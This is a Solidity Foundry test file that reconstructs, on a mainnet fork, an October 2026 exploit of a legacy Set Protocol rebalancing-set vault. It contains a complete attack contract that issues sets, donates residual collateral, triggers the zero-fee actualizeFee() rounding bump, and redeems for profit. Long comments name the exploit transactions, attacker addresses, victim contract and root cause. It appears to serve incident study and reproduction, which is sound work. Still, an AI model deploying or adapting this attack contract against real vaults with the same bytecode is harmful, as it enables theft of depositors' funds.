// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Set Protocol (legacy) - RebalancingSetTokenV3.actualizeFee() unit-share rounding manipulation,
// amplified by a donate step, draining the ETHMACOAPY vault. Ethereum, Oct 2026. ~4.048 WETH (tx1).
//
// This is a DIFFERENT incident from the already-shipped SetProtocol_exp.sol (that one drained a
// different RebalancingSetTokenV3 vault, 0x54e8..., in a single tx amplified by a Uniswap v4 flash
// loan). Same root cause, different vault, different txs, different attackers, and a different
// amplification shape (donation of residual collateral instead of a huge single issue). Everything
// below was re-verified against THIS vault and THESE transactions, not inherited.
//
// Exploit tx 1 : 0xb54c77dae4c5ff8664779bacfb56d75242f39005b0b7778109d2f9033b9e8fc2 (block 26132514)
// Attacker  1  : 0x3A15Cf422307e922645d671Cb247e76e8b1eC50d (EOA)
//                0xa0F52c688345D05859a94499E0809577B28f4e6d (attack contract doing the Set calls)
// Victim (ETHMACOAPY rebalancing set) : 0xB647a1D7633c6C4d434e22eE9756b36F2b219525
//
// A second, independent tx two blocks later repeated the exact pattern from a different EOA:
// Exploit tx 2 : 0x1dc6b9f18c362192397e8483088f7957622a9323fd93ed2a22073bf309c8e08a (block 26132516)
// Attacker  2  : 0xfc3fAcD67138966aB0c841E905B0C4BCA1AbE92F (EOA)
// tx2 removed a further ~4.062 WETH, so the full incident total (~8.11 WETH across the two EOAs)
// is NOT captured by this single-tx reconstruction; this file asserts tx1's ~4.048 WETH only.
//
// Root cause (re-confirmed on THIS vault):
//   RebalancingSetTokenV3 stores `unitShares`, the amount of backing currentSet held per
//   naturalUnit of rebalancing-set supply. actualizeFee() is public, gated only by the set being
//   a validSet (confirmed in the trace: updateAndGetFee() calls Core.validSets(rSet) -> true, reads
//   unitShares/naturalUnit/currentSet/oracle, and has no owner/role/signature gate). It calls the
//   fee calculator, mints nothing when both fees are zero, and then re-derives unitShares as
//       calculateNewUnitShares() = currentSetAmount.mul(naturalUnit).divCeil(totalSupply())
//   where currentSetAmount = Vault.getOwnerBalance(currentSet, rSet). divCeil ROUNDS UP.
//
//   The ETHMACOAPY rebalancing set at 0xB647... has the SAME bytecode as the already-source-verified
//   vault 0x54e8... (extcodehash 0xd18acd8832e87c8db17449e7e8da7d0c3687826b9141f1b43f92ba8de31c2699
//   for both), so the actualizeFee / calculateNewUnitShares / divCeil logic is byte-for-byte the
//   code whose source was read for the first PoC. The trace confirms it live:
//     FeeActualization(..., profitFee: 0, streamingFee: 0)   // zero fee
//     IncentiveFeePaid(..., newUnitShares: 12264)            // unitShares still moved
//   The stored value went 12253 -> 12264 across the single actualizeFee() call.
//
//   The attacker widens the +rounding into +11 by DONATING collateral before triggering: after
//   issuing the rebalancing set, the residual base-set balance is pushed into the rSet's own Vault
//   backing (Core.deposit + Core.internalTransfer) WITHOUT minting any new rSet. That raises
//   currentSetAmount while totalSupply is unchanged, so the ceil re-derivation jumps unitShares by
//   11, not 1. Issuing costs 12253 base-set per naturalUnit; redeeming the same quantity after
//   actualizeFee pays 12264 per naturalUnit. The gap, over the issued quantity, is the profit.
//
// Base set shape (this vault): currentSet = 0x10c9ACd6E7b65aBAf04118198553B375dC2B0Ad4, whose only
// component is WETH (getComponents() == [WETH]). So issuing/redeeming the base set is a pure
// WETH in/out - no intermediate token swaps, unlike the first PoC's multi-component base set.
//
// Working capital: the gain scales with issue size, so turning the rounding edge into ~4 WETH needs
// ~116,000 WETH for one atomic block. The real tx borrowed it fee-free from an Aave-v3-fork lending
// pool (pool proxy 0x5aE329203E00f76891094DcfedD5Aca082a50e1b, aWETH 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB),
// repaying exactly the 116,000 WETH principal with zero premium (confirmed in the trace: the
// executeOperation callback approves exactly 116000e18 back, no premium added). This reconstruction
// supplies the identical 116,000 WETH via vm.deal and measures profit strictly as the WETH surplus
// over that full principal, so the loan nets out exactly as on-chain and only the Set Protocol
// rounding gain is counted. The lender's own fork bookkeeping is deliberately not coupled in.
//
// The Set Protocol side is driven with real typed calls into the real Core / Vault / TransferProxy /
// RebalancingSetTokenV3 at mainnet state - no create()-deployed attacker bytecode, no calldata
// replay. Issue quantities are the attacker's real inputs; the donation and all withdraw amounts
// are read live from the Vault so the unitShares bump is what carries the surplus through.
//
// Run (self-contained mainnet archive fork):
//   forge test --contracts ./src/test/2026-10/SetProtocolETHMACOAPY_exp.sol -vvv

interface IWETH {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

// Set Protocol v1 Core (issuance/redemption + vault deposit/withdraw/internal transfer)
interface ICore {
    function issue(address set, uint256 quantity) external;
    function redeem(address set, uint256 quantity) external;
    function deposit(address token, uint256 quantity) external;
    function withdraw(address token, uint256 quantity) external;
    function internalTransfer(address token, address to, uint256 quantity) external;
}

interface IRebalancingSetToken {
    function actualizeFee() external;
    function unitShares() external view returns (uint256);
    function naturalUnit() external view returns (uint256);
    function currentSet() external view returns (address);
}

interface IVault {
    function getOwnerBalance(address token, address owner) external view returns (uint256);
}

contract SetAttacker {
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 internal constant MAX = type(uint256).max;

    ICore internal immutable core;
    IVault internal immutable vault;
    address internal immutable transferProxy;
    IRebalancingSetToken internal immutable rSet;
    IERC20 internal immutable baseSet;

    // Real attacker inputs from tx1.
    uint256 internal constant PRINCIPAL = 116_000 ether; // flash-borrowed WETH, repaid in full
    uint256 internal constant BASE_SET_QTY = 1_728_534_698_486_328_000_000; // base SetToken issued
    uint256 internal constant RSET_QTY = 140_948_713_161_425_283_000_000; // rebalancing set issued

    // Observed unit-share bump, exposed for the test to assert.
    uint256 public unitSharesBefore;
    uint256 public unitSharesAfter;
    uint256 public donatedBaseSet;

    constructor(address _core, address _vault, address _transferProxy, address _rSet) {
        core = ICore(_core);
        vault = IVault(_vault);
        transferProxy = _transferProxy;
        rSet = IRebalancingSetToken(_rSet);
        baseSet = IERC20(IRebalancingSetToken(_rSet).currentSet());
    }

    // Working capital (PRINCIPAL WETH) is dealt to this contract by the test before run().
    function run() external {
        uint256 nu = rSet.naturalUnit();

        // 1. Approvals for the TransferProxy to pull components into the Vault.
        WETH.approve(transferProxy, MAX);
        baseSet.approve(transferProxy, MAX);

        // 2. Issue the base SetToken (pulls ~PRINCIPAL WETH, mints base set to this contract).
        core.issue(address(baseSet), BASE_SET_QTY);

        // 3. Issue the rebalancing set at the floor-rounded unitShares (12253), pulling base set.
        core.issue(address(rSet), RSET_QTY);

        // 4. DONATE the residual base set into the rSet's own Vault backing, minting no rSet.
        //    This raises currentSetAmount while totalSupply is unchanged, widening the ceil bump.
        donatedBaseSet = baseSet.balanceOf(address(this));
        core.deposit(address(baseSet), donatedBaseSet);
        core.internalTransfer(address(baseSet), address(rSet), donatedBaseSet);

        // 5. The bug: zero-fee actualizeFee() re-ceils unitShares upward (12253 -> 12264).
        unitSharesBefore = rSet.unitShares();
        rSet.actualizeFee();
        unitSharesAfter = rSet.unitShares();

        // 6. Redeem the rebalancing set at the inflated unitShares -> more base set than was paid in.
        core.redeem(address(rSet), RSET_QTY);
        core.withdraw(address(baseSet), vault.getOwnerBalance(address(baseSet), address(this)));

        // 7. Unwind the base set back to WETH (redeem quantity must be a naturalUnit multiple).
        uint256 bal = baseSet.balanceOf(address(this));
        uint256 redeemable = bal - (bal % nu);
        core.redeem(address(baseSet), redeemable);
        core.withdraw(address(WETH), vault.getOwnerBalance(address(WETH), address(this)));
    }

    function wethBalance() external view returns (uint256) {
        return WETH.balanceOf(address(this));
    }
}

contract SetProtocolETHMACOAPY_exp is Test {
    uint256 internal constant ATTACK_BLOCK = 26132514;
    uint256 internal constant PRINCIPAL = 116_000 ether;
    uint256 internal constant EXPECTED_PROFIT = 4_047_988_247_781_965_824; // ~4.0480 WETH

    address internal constant CORE = 0xf55186CC537E7067EA616F2aaE007b4427a120C8;
    address internal constant VAULT = 0x5B67871C3a857dE81A1ca0f9F7945e5670D986Dc;
    address internal constant TRANSFER_PROXY = 0x882d80D3a191859d64477eb78Cca46599307ec1C;
    address internal constant RSET = 0xB647a1D7633c6C4d434e22eE9756b36F2b219525; // ETHMACOAPY
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    string internal constant MAINNET_ARCHIVE = "https://eth-mainnet.public.blastapi.io";

    function setUp() public {
        vm.createSelectFork(MAINNET_ARCHIVE, ATTACK_BLOCK - 1);
    }

    function testExploit() public {
        SetAttacker atk = new SetAttacker(CORE, VAULT, TRANSFER_PROXY, RSET);

        // Supply the same 116,000 WETH working capital the attacker flash-borrowed fee-free.
        deal(WETH, address(atk), PRINCIPAL);

        atk.run();

        emit log_named_uint("unitShares before actualizeFee", atk.unitSharesBefore());
        emit log_named_uint("unitShares after  actualizeFee", atk.unitSharesAfter());
        emit log_named_decimal_uint("base set donated into rSet backing", atk.donatedBaseSet(), 18);

        // The zero-fee actualizeFee re-ceil moved the stored unitShares up (12253 -> 12264).
        assertEq(atk.unitSharesBefore(), 12253, "pre-bump unitShares");
        assertEq(atk.unitSharesAfter(), 12264, "post-bump unitShares");

        // Profit = WETH left over the fully repaid principal.
        uint256 finalWeth = atk.wethBalance();
        assertGt(finalWeth, PRINCIPAL, "no surplus over principal");
        uint256 profit = finalWeth - PRINCIPAL;
        emit log_named_decimal_uint("WETH profit (tx1)", profit, 18);
        assertApproxEqRel(profit, EXPECTED_PROFIT, 0.01e18);
    }
}
